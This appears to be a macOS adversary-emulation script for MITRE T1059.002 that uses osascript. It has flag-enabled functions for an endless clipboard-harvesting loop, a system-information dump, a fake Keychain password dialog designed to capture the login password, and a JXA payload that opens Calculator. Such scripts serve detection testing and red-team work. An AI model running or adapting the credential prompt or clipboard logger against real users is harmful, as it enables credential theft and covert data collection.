#!/bin/sh
# POSIX-compliant
# Procedure Name: osascript
# Tactic: Execution
# Technique: T1059.002
# GUID: d77e7fe0-bb48-4dec-8b95-5653951b3b43
# Intent: Execute AppleScripts and other OSA language scripts and commands. Sourced from LOOBins; confirm MITRE mapping for each enabled option.
...
TACTIC="Execution" #replace with you coresponding tactic
TTP_ID="T1059.002" #replace with you coresponding ttp_id
...
USE_THE_OSASCRIPT_BINARY_TO_GATHER_SENSITIVE_CLIPBOARD_DATA=false
USE_THE_OSASCRIPT_BINARY_TO_GATHER_SYSTEM_INFORMATION=false
USE_THE_OSASCRIPT_BINARY_TO_PROMPT_THE_USER_FOR_CREDENTIALS=false
USE_THE_OSASCRIPT_BINARY_TO_EXECUTE_A_JXA_JAVASCRIPT_FOR_AUTOMATION_FI=false
...
PROCEDURE_NAME="osascript"  # Set by build system from YAML procedure_name field
...
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        --use-the-osascript-binary-to-gather-sensitive-clipboard-data)
            USE_THE_OSASCRIPT_BINARY_TO_GATHER_SENSITIVE_CLIPBOARD_DATA=true
            ;;
        --use-the-osascript-binary-to-gather-system-information)
            USE_THE_OSASCRIPT_BINARY_TO_GATHER_SYSTEM_INFORMATION=true
            ;;
        --use-the-osascript-binary-to-prompt-the-user-for-credentials)
            USE_THE_OSASCRIPT_BINARY_TO_PROMPT_THE_USER_FOR_CREDENTIALS=true
            ;;
        --use-the-osascript-binary-to-execute-a-jxa-javascript-for-automation-fi)
            USE_THE_OSASCRIPT_BINARY_TO_EXECUTE_A_JXA_JAVASCRIPT_FOR_AUTOMATION_FI=true
            ;;
            *)
...
SCRIPT:
  --use-the-osascript-binary-to-gather-sensitive-clipboard-data A bash loop can gather clipboard contents over a defined time period. The following command calls /u
  --use-the-osascript-binary-to-gather-system-information osascript can be used to gather the operating system version, current username, user ID, computer na
  --use-the-osascript-binary-to-prompt-the-user-for-credentials osascript can be used to generate a dialogue box and request the user to enter the keychain password
  --use-the-osascript-binary-to-execute-a-jxa-javascript-for-automation-fi JXA is often used by red teams (and potentially attackers) as a macOS payload, as JXA is native to m
...
# Execute functions for --use-the-osascript-binary-to-gather-sensitive-clipboard-data
if [ "$USE_THE_OSASCRIPT_BINARY_TO_GATHER_SENSITIVE_CLIPBOARD_DATA" = true ]; then
    core_debug_print "Executing functions for --use-the-osascript-binary-to-gather-sensitive-clipboard-data"
    result=$(execute_function execute_use_osascript_binary_gather_sensitive_clipboard_data)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --use-the-osascript-binary-to-gather-system-information
if [ "$USE_THE_OSASCRIPT_BINARY_TO_GATHER_SYSTEM_INFORMATION" = true ]; then
    core_debug_print "Executing functions for --use-the-osascript-binary-to-gather-system-information"
    result=$(execute_function execute_use_osascript_binary_gather_system_information)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --use-the-osascript-binary-to-prompt-the-user-for-credentials
if [ "$USE_THE_OSASCRIPT_BINARY_TO_PROMPT_THE_USER_FOR_CREDENTIALS" = true ]; then
    core_debug_print "Executing functions for --use-the-osascript-binary-to-prompt-the-user-for-credentials"
    result=$(execute_function execute_use_osascript_binary_prompt_user_credentials)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --use-the-osascript-binary-to-execute-a-jxa-javascript-for-automation-fi
if [ "$USE_THE_OSASCRIPT_BINARY_TO_EXECUTE_A_JXA_JAVASCRIPT_FOR_AUTOMATION_FI" = true ]; then
    core_debug_print "Executing functions for --use-the-osascript-binary-to-execute-a-jxa-javascript-for-automation-fi"
    result=$(execute_function execute_use_osascript_binary_execute_jxa_javascript_automation_file)
    raw_output="${raw_output}${result}"
fi
...
# Function: execute_use_osascript_binary_gather_sensitive_clipboard_data
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_use_osascript_binary_gather_sensitive_clipboard_data() {
    local result
    result=$(while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_use_osascript_binary_gather_system_information
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_use_osascript_binary_gather_system_information() {
    local result
    result=$(osascript -e 'return (system info)' 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_use_osascript_binary_prompt_user_credentials
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_use_osascript_binary_prompt_user_credentials() {
    local result
    result=$(osascript -e 'set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with icon file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns" with title "Authentication Needed" with hidden answer' 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_use_osascript_binary_execute_jxa_javascript_automation_file
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_use_osascript_binary_execute_jxa_javascript_automation_file() {
    local result
    result=$(echo "ObjC.import('Cocoa');\nObjC.import('stdlib');\nvar currentApp = Application.currentApplication();\ncurrentApp.includeStandardAdditions = true;\ncurrentApp.doShellScript('open -a Calculator.app');" > calc.js && osascript -l JavaScript calc.js 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}
